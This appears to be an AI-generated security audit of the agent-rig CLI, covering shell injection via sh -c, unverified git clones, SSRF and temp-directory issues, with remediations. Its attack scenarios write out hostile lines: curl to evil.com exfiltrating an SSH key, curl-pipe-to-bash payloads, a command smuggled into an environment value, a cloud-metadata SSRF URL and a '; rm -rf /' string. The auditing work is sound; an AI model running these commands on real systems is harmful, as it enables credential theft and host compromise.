# Security Audit: agent-rig CLI Tool

**Date:** 2026-02-08
**Auditor:** Claude Opus 4.6 (Automated Security Analysis)
**Scope:** All source files under `/root/projects/agent-rig/src/`, example manifests, and build configuration
**Exclusions:** `docs/plans/`, `docs/solutions/` (per instructions)

---

## Executive Summary

The agent-rig CLI tool presents a **HIGH overall risk profile** due to its fundamental design: it clones arbitrary Git repositories, parses attacker-controlled JSON manifests, and executes shell commands defined in those manifests on the host machine. The tool is essentially an install-from-untrusted-source system with no sandboxing, no signature verification, and no user confirmation before executing arbitrary commands.

Three findings are rated **CRITICAL**, three are rated **HIGH**, and several additional **MEDIUM** and **LOW** findings are documented below.

| Severity | Count |
|----------|-------|
| Critical | 3     |
| High     | 3     |
| Medium   | 4     |
| Low      | 3     |

---

## Critical Findings

### CRIT-01: Arbitrary Command Execution via `sh -c` with Manifest-Defined Commands

**File:** `/root/projects/agent-rig/src/commands/install.ts`, lines 48 and 69
**CVSS Estimate:** 9.8 (Critical)

The `installTools()` function passes manifest-defined strings directly to `sh -c`:

```typescript
// Line 48 — tool.check comes from untrusted manifest JSON
await execFileAsync("sh", ["-c", tool.check], { timeout: 5_000 });

// Line 69 — tool.install comes from untrusted manifest JSON
await execFileAsync("sh", ["-c", tool.install], { timeout: 120_000 });
```

While `execFile` (not `exec`) is used, the explicit `sh -c` invocation negates all of `execFile`'s safety properties. Passing a string to `sh -c` gives the shell full control over parsing, meaning the attacker-controlled manifest string is interpreted by `sh` with full shell expansion, piping, command chaining, and arbitrary code execution.

**Attack Scenario:**
A malicious `agent-rig.json` could contain:
```json
{
  "tools": [{
    "name": "backdoor",
    "check": "curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)",
    "install": "curl https://evil.com/payload.sh | bash",
    "optional": false
  }]
}
```

The `check` command runs *before* any install decision is made (line 48), so even the presence of the tool in the manifest causes code execution. The attacker does not need the tool to actually be "not installed" -- the `check` command itself runs arbitrary code.

**Impact:** Complete host compromise. The attacker can read/write arbitrary files, install backdoors, exfiltrate secrets, pivot to other systems, and establish persistence. The tool runs with the full privileges of the user executing `agent-rig install`.

**Remediation:**
1. Do NOT pass manifest-defined strings to `sh -c`. Instead, require structured install/check commands (e.g., `{"command": "npm", "args": ["install", "-g", "package"]}`).
2. Implement a mandatory interactive confirmation step that displays the exact commands to be executed and requires explicit user approval.
3. Consider sandboxing tool installation in a restricted environment (e.g., a container, or at minimum a restricted shell).
4. Add an allowlist of permitted install command patterns (e.g., `npm install -g`, `go install`, `pip install`).

---

### CRIT-02: Arbitrary Script Execution via Codex Install Script

**File:** `/root/projects/agent-rig/src/adapters/codex.ts`, lines 38-42

```typescript
const installScript = (codexConfig as any).installScript;
if (installScript) {
  await execFileAsync("bash", [installScript, "install"], {
    timeout: 60_000,
  });
}
```

The `installScript` path comes directly from the manifest's `platforms.codex.installScript` field. This path is resolved relative to the cloned repository. Since the repository is attacker-controlled, the script content is entirely under the attacker's control.

**Attack Scenario:**
An attacker publishes a repo with a `scripts/install-codex.sh` containing:
```bash
#!/bin/bash
# Looks legitimate but...
curl https://evil.com/rootkit.sh | bash
```

**Impact:** Same as CRIT-01 -- complete host compromise.

**Additional concern:** The `(codexConfig as any).installScript` cast bypasses TypeScript type safety. The schema defines `installScript` as `z.string().optional()`, but the adapter retrieves it with an `any` cast, which could allow unexpected types to reach `execFileAsync`.

**Remediation:**
1. Validate the script path against the cloned repo root to prevent path traversal (e.g., `../../etc/cron.d/backdoor`).
2. Require user confirmation before executing any scripts.
3. Remove the `as any` cast and access the typed schema value directly.
4. Consider requiring scripts to be signed or checksum-verified.

---

### CRIT-03: Supply Chain Attack Surface via Unverified Git Clone

**Files:**
- `/root/projects/agent-rig/src/commands/install.ts`, lines 37-40
- `/root/projects/agent-rig/src/commands/inspect.ts`, lines 25-29

```typescript
// install.ts
await execFileAsync("git", ["clone", "--depth", "1", source.url, dest], {
  timeout: 60_000,
});

// inspect.ts
await execFileAsync("git", ["clone", "--depth", "1", source.url, dir], {
  timeout: 60_000,
});
```

Rigs are cloned from arbitrary GitHub repositories with no verification of:
- Repository authenticity or ownership
- Manifest integrity (no signatures, no checksums)
- Whether the repository has been compromised since last review
- Commit signing

An `agent-rig install mistakeknot/Clavain` trusts that `github.com/mistakeknot/Clavain` has not been compromised. If the repo owner's GitHub account is compromised, or if a typosquat repo like `mistakenot/Clavain` is created, the user installs attacker-controlled code.

**Impact:** Combined with CRIT-01, this is the primary delivery vector for malicious manifests. The entire trust model is "trust the GitHub URL the user typed."

**Remediation:**
1. Implement manifest signing with GPG or similar. Verify signatures before executing any manifest content.
2. Support pinning to specific commit hashes, not just repo URLs.
3. Maintain a registry of known-good rigs with pre-verified checksums.
4. Add a `--trust` flag that is required for first-time installs from new sources.
5. Show a diff/summary of what will be executed and require explicit confirmation.

---

## High Findings

### HIGH-01: SSRF via Health Check URLs

**File:** `/root/projects/agent-rig/src/adapters/claude-code.ts`, lines 100-105

```typescript
if (server.type === "http" && "healthCheck" in server && server.healthCheck) {
  const { ok } = await run("curl", [
    "-s",
    "--max-time",
    "2",
    server.healthCheck,
  ]);
}
```

The `healthCheck` URL comes from the manifest and is passed directly to `curl`. While Zod validates that it is a syntactically valid URL (`z.string().url()`), it does not restrict the URL to safe targets.

**Attack Scenario:**
```json
{
  "mcpServers": {
    "evil": {
      "type": "http",
      "url": "http://localhost:1234/mcp",
      "healthCheck": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    }
  }
}
```
This performs an SSRF attack against cloud metadata services, potentially exfiltrating IAM credentials. The `curl` output is captured and used to set the `ok` status, and while the raw response is not printed, the pass/fail signal itself can be used as an oracle.

Other targets: internal network services, localhost admin panels, file:// protocol (if curl follows redirects to file://), gopher:// for more complex attacks.

**Impact:** Internal network reconnaissance, cloud credential theft, access to internal services.

**Remediation:**
1. Restrict health check URLs to localhost/loopback only, or to the same host as the MCP server URL.
2. Add `--proto -all,http,https` to curl to prevent protocol-based attacks.
3. Add `--no-location` to prevent redirect-based SSRF.
4. Block RFC 1918 and link-local IP ranges when the server URL points to an external host.

---

### HIGH-02: MCP Server `stdio` Command Injection

**File:** `/root/projects/agent-rig/src/schema.ts`, lines 29-34

```typescript
const McpServerStdio = z.object({
  type: z.literal("stdio"),
  command: z.string(),
  args: z.array(z.string()).optional(),
  description: z.string().optional(),
});
```

The schema accepts arbitrary `command` strings for stdio-type MCP servers. While the current code does not directly execute these commands (it just stores them in the validated manifest), the intent is for downstream tools (Claude Code, Codex) to execute them. The `inspect` command displays the command value:

```typescript
// inspect.ts, line 84
const detail = server.type === "stdio" ? server.command : server.url;
```

This is a latent injection vector: the manifest defines commands that will be executed by the consuming platform. Even if agent-rig does not execute them directly, it is the gatekeeper and should validate them.

**Impact:** The consuming platform (Claude Code, Codex) will execute the specified command. A malicious manifest can specify any binary as the stdio MCP server command.

**Remediation:**
1. Validate `command` against an allowlist of known MCP server binaries.
2. Require the command to be an absolute path or a known command name (no shell metacharacters).
3. Reject commands containing shell operators (`;`, `|`, `&&`, `||`, `` ` ``, `$(`).
4. Display a security warning when `inspect` shows stdio commands.

---

### HIGH-03: No User Confirmation Before Destructive Actions

**File:** `/root/projects/agent-rig/src/commands/install.ts`

The `install` command executes all actions (clone, install plugins, install tools, run health checks) without ever asking the user for confirmation. The `--dry-run` flag exists but is opt-in, and the default is to execute everything immediately.

Combined with the other findings, this means `agent-rig install evil-user/malicious-rig` will immediately:
1. Clone the repo
2. Run all `tool.check` shell commands
3. Run all `tool.install` shell commands
4. Execute `curl` against all health check URLs
5. Run `claude plugin install` for all plugins
6. Execute the Codex install script

All without a single confirmation prompt.

**Impact:** Amplifies all other vulnerabilities. A single `agent-rig install` invocation with a malicious source triggers immediate, automated compromise.

**Remediation:**
1. Display a full summary of what will be executed before any action is taken.
2. Require explicit `--yes` or interactive confirmation.
3. Show shell commands that will be run with a prominent warning.
4. Make `--dry-run` the default behavior for first-time installs from unknown sources.

---

## Medium Findings

### MED-01: Path Traversal in Manifest Loading

**File:** `/root/projects/agent-rig/src/loader.ts`, line 60

```typescript
const manifestPath = join(dir, "agent-rig.json");
```

The `dir` parameter comes from user input (via `resolveSource`). While `join()` normalizes paths, there is no validation that the resulting path is within an expected directory. For local paths, the user controls the directory entirely, which is expected behavior. However, for GitHub-cloned repos, the `dir` should be the clone destination, and no path traversal check is applied.

More concerning is the Codex adapter's `installScript` path, which is joined to the repo directory with no traversal check. A manifest could specify `installScript: "../../.bashrc"` to trick the system into executing the user's `.bashrc` as an install script (though this would likely fail harmlessly in practice, the path is not validated).

**Impact:** Low to Medium. Could be used to read manifests from unexpected locations or execute scripts outside the cloned directory.

**Remediation:**
1. Resolve the final path and verify it starts with the expected base directory.
2. Use `path.resolve()` and check that the result is a child of the expected root.

---

### MED-02: Environment Variable Values Printed Verbatim

**File:** `/root/projects/agent-rig/src/commands/install.ts`, lines 143-149

```typescript
if (rig.environment && Object.keys(rig.environment).length > 0) {
  console.log(chalk.bold("\nEnvironment Variables"));
  console.log(chalk.dim("  Add these to your shell profile:"));
  for (const [key, value] of Object.entries(rig.environment)) {
    console.log(`  export ${key}="${value}"`);
  }
}
```

Environment variable keys and values from the manifest are printed as shell export statements. If the user copies and pastes these into their shell profile (as instructed), a malicious manifest can inject arbitrary shell commands via the value:

```json
{
  "environment": {
    "INNOCENT_VAR": "value\"; curl https://evil.com/payload.sh | bash; echo \""
  }
}
```

When pasted into `.bashrc`, this becomes:
```bash
export INNOCENT_VAR="value"; curl https://evil.com/payload.sh | bash; echo ""
```

**Impact:** Shell injection when the user follows the tool's own instructions to add environment variables to their shell profile.

**Remediation:**
1. Validate environment variable names against `^[A-Z_][A-Z0-9_]*$`.
2. Validate environment variable values contain no shell metacharacters.
3. Escape values properly when outputting shell export statements (use single quotes, escape embedded single quotes).
4. Consider writing to a dedicated env file that is sourced safely rather than instructing copy-paste.

---

### MED-03: Temporary Directory Predictability and Cleanup

**File:** `/root/projects/agent-rig/src/commands/install.ts`, line 35

```typescript
const dest = join(tmpdir(), `agent-rig-${source.repo}-${Date.now()}`);
```

Similarly in `inspect.ts`, line 21:
```typescript
dir = join(tmpdir(), `agent-rig-inspect-${source.repo}-${Date.now()}`);
```

Issues:
1. **No cleanup:** Cloned repositories in `/tmp` are never deleted after installation. Over time, this accumulates potentially sensitive data in world-readable `/tmp` directories.
2. **Partial predictability:** The repo name is attacker-controlled and `Date.now()` is predictable within a narrow window. While `execFile` uses `git clone` which creates the directory itself, a race condition could allow a pre-created symlink at the expected path.
3. **No directory permission restriction:** The cloned directory inherits default umask permissions, making the repo content potentially readable by other users on the system.

**Impact:** Data leakage via undeleted temp directories, potential race conditions.

**Remediation:**
1. Use `mkdtemp()` from `node:fs/promises` for cryptographically random temp directory names.
2. Clean up cloned directories after installation (use `finally` blocks).
3. Set restrictive permissions on temp directories (`mode: 0o700`).

---

### MED-04: Error Messages May Leak System Information

**Files:** Multiple locations across the codebase

```typescript
// install.ts, line 75
message: err.message,

// codex.ts, line 48
message: err.message,
```

When tool installation or script execution fails, the raw error message (including system paths, usernames, and potentially sensitive system configuration) is printed directly to the console. In a CI/CD context, these could end up in logs visible to other team members or systems.

**Impact:** Information disclosure of system paths, usernames, installed software versions.

**Remediation:**
1. Sanitize error messages before display (strip absolute paths, usernames).
2. Log full errors to a debug log file, show only safe summaries to console.

---

## Low Findings

### LOW-01: No Input Sanitization on `resolveSource`

**File:** `/root/projects/agent-rig/src/loader.ts`, lines 20-57

The `resolveSource` function handles user input but does not sanitize special characters. While the GitHub regex (`/^([a-zA-Z0-9_.-]+)\/([a-zA-Z0-9_.-]+)$/`) provides some validation for the shorthand format, full URLs pass through with minimal validation. The `http://` URL regex allows any path after the GitHub domain.

The `source.url` is eventually passed to `git clone`, and since `execFile` is used (not `exec`), shell injection via the URL is not possible. However, Git itself can be exploited with specially crafted repository names containing `--` (option injection):

```
agent-rig install "--upload-pack=malicious-command"
```

This would be parsed as a local path (starts with `--`), not a GitHub source, so it would hit `loadManifest` and fail. However, the edge case is worth noting.

**Impact:** Low. The current flow makes exploitation difficult, but the lack of input validation is a defense-in-depth gap.

**Remediation:**
1. Reject source arguments that start with `-` to prevent git option injection.
2. Validate GitHub URLs more strictly (require `https://` scheme, disallow query parameters and fragments).

---

### LOW-02: No Lockfile Integrity Verification

**File:** `/root/projects/agent-rig/pnpm-lock.yaml`

The project's own dependencies (chalk, commander, zod) are pinned via the lockfile, which is good. However, there is no `npm audit` or dependency scanning integrated into the build process. The dependencies are relatively minimal and well-known, reducing risk.

**Impact:** Low. Supply chain risk through compromised npm packages.

**Remediation:**
1. Add `pnpm audit` to the CI pipeline.
2. Consider using Socket or Snyk for dependency scanning.
3. Pin exact versions in `package.json` rather than using `^` ranges.

---

### LOW-03: Plugin Source Strings Are Not Validated Beyond Format

**File:** `/root/projects/agent-rig/src/schema.ts`, lines 5-8

```typescript
const PluginRef = z.object({
  source: z.string().describe("Plugin identifier: name@marketplace"),
  description: z.string().optional(),
});
```

Plugin source identifiers are validated only as strings with no format constraints. The expected format is `name@marketplace`, but a source string like `; rm -rf /` would pass schema validation and be passed to `claude plugin install`.

Since `execFile` is used (not `exec`), and the plugin source is passed as a single argument to the `claude` binary, shell injection is mitigated by Node.js's argument array handling. However, the `claude` CLI itself may interpret special characters in the plugin name.

**Impact:** Low. The `execFile` usage prevents shell injection, but unexpected characters could cause issues in the downstream `claude` CLI.

**Remediation:**
1. Add a regex constraint to plugin source strings: `z.string().regex(/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+$/)`.
2. Validate marketplace repo strings similarly.

---

## Security Architecture Assessment

### Positive Security Properties

1. **`execFile` over `exec`:** The codebase consistently uses `execFile` (which does not invoke a shell) rather than `exec`. This prevents shell injection when passing arguments as arrays. This is a strong positive pattern seen in the adapter code.

2. **Zod schema validation:** Manifest validation at load time catches malformed inputs before they reach execution paths. The schema is reasonably strict on structural requirements.

3. **Timeout on all child processes:** All `execFile` calls include timeouts (5s, 30s, 60s, or 120s), preventing indefinite hangs from malicious or broken commands.

4. **Shallow clone:** `--depth 1` limits the amount of potentially malicious data cloned from repositories.

5. **TypeScript strict mode:** The project uses `"strict": true` in `tsconfig.json`, enabling stricter type checking.

### Critical Architectural Gaps

1. **No sandboxing:** All commands execute with the full privileges of the user. There is no containerization, chroot, seccomp, or other isolation.

2. **No signing or verification:** Manifests are not signed. There is no way to verify that a manifest has not been tampered with.

3. **No user confirmation:** The install flow is fully automated with no interactive confirmation.

4. **Trust model is implicit:** The tool trusts whatever GitHub URL the user provides. There is no concept of trusted sources, verified publishers, or reputation.

5. **The `sh -c` pattern defeats `execFile` safety:** The deliberate choice to pass manifest strings to `sh -c` (in `installTools()`) completely undermines the safety of `execFile`. This is the single most dangerous pattern in the codebase.

---

## OWASP Top 10 Compliance

| OWASP Category | Status | Notes |
|---|---|---|
| A01: Broken Access Control | N/A | CLI tool, no multi-user access control |
| A02: Cryptographic Failures | FAIL | No manifest signing, no integrity verification |
| A03: Injection | FAIL | `sh -c` with manifest-defined commands (CRIT-01) |
| A04: Insecure Design | FAIL | No confirmation prompts, no sandboxing (HIGH-03) |
| A05: Security Misconfiguration | WARN | Temp directory handling (MED-03) |
| A06: Vulnerable Components | PASS | Dependencies are minimal and current |
| A07: Auth Failures | N/A | No authentication system |
| A08: Data Integrity Failures | FAIL | No signature verification on manifests (CRIT-03) |
| A09: Logging Failures | WARN | Error messages may leak info (MED-04) |
| A10: SSRF | FAIL | Health check URLs are user-controlled (HIGH-01) |

---

## Security Requirements Checklist

- [ ] **All inputs validated and sanitized** -- FAIL. Shell commands from manifest are not sanitized.
- [x] **No hardcoded secrets or credentials** -- PASS. No secrets found in source.
- [ ] **Proper authentication on all endpoints** -- N/A (CLI tool).
- [ ] **SQL queries use parameterization** -- N/A (no database).
- [ ] **XSS protection implemented** -- N/A (no web UI).
- [ ] **HTTPS enforced where needed** -- PARTIAL. GitHub URLs use HTTPS, but manifest can specify HTTP MCP servers.
- [ ] **CSRF protection enabled** -- N/A (no web UI).
- [ ] **Security headers properly configured** -- N/A (no HTTP server).
- [ ] **Error messages don't leak sensitive information** -- FAIL (MED-04).
- [x] **Dependencies are up-to-date and vulnerability-free** -- PASS. Minimal, current deps.

---

## Remediation Roadmap (Priority Order)

### Phase 1: Immediate (Before Any Public Release)

1. **[CRIT-01] Replace `sh -c` with structured commands.** Refactor `ExternalTool` schema to require structured `command` + `args` arrays instead of free-form shell strings. If shell strings must be supported, add mandatory interactive confirmation showing the exact command.

2. **[HIGH-03] Add interactive confirmation.** Before executing any install actions, display a summary of all operations (plugins to install, tools to run, scripts to execute, health checks to curl) and require explicit user confirmation.

3. **[CRIT-02] Validate and sandbox script execution.** Validate the `installScript` path is within the cloned repository. Display script contents before execution. Require confirmation.

### Phase 2: Short-Term (Before Wide Adoption)

4. **[CRIT-03] Implement manifest signing.** Add support for signed manifests with GPG or cosign. Allow users to configure trusted signing keys.

5. **[HIGH-01] Restrict health check URLs.** Add URL validation to prevent SSRF. Restrict to localhost for local servers, add protocol restrictions.

6. **[HIGH-02] Validate MCP server commands.** Add constraints to stdio server command fields.

7. **[MED-02] Sanitize environment variable output.** Validate env var names and values, use safe quoting in output.

### Phase 3: Ongoing

8. **[MED-03] Fix temp directory handling.** Use `mkdtemp`, clean up after install, set permissions.

9. **[MED-04] Sanitize error messages.** Strip system paths from user-facing output.

10. **[LOW-01-03] Input validation hardening.** Add regex constraints to plugin sources, reject `-`-prefixed source args, integrate dependency scanning.

---

## Risk Matrix

```
                    Low Impact    Medium Impact    High Impact    Critical Impact
                    ─────────────────────────────────────────────────────────────
Likely              LOW-03        MED-02           HIGH-03        CRIT-01
                                  MED-03                          CRIT-02
                                  MED-04
─────────────────────────────────────────────────────────────────────────────────
Possible            LOW-01        MED-01           HIGH-01        CRIT-03
                    LOW-02                         HIGH-02
─────────────────────────────────────────────────────────────────────────────────
Unlikely
```

---

## Conclusion

The agent-rig CLI tool has a fundamentally dangerous threat model: it downloads and executes attacker-controlled code from the internet. The `sh -c` invocation pattern with manifest-defined shell strings (CRIT-01) is the most urgent finding and must be addressed before any public release. The lack of user confirmation (HIGH-03) amplifies every other vulnerability, turning what could be "review-then-execute" into "execute-immediately."

The codebase shows good engineering practices in many areas (TypeScript strict mode, Zod validation, `execFile` usage, timeouts), but these are undermined by the `sh -c` escape hatch and the absence of manifest integrity verification. The security improvements outlined in the remediation roadmap should be prioritized before the tool is used in production environments or distributed to other users.
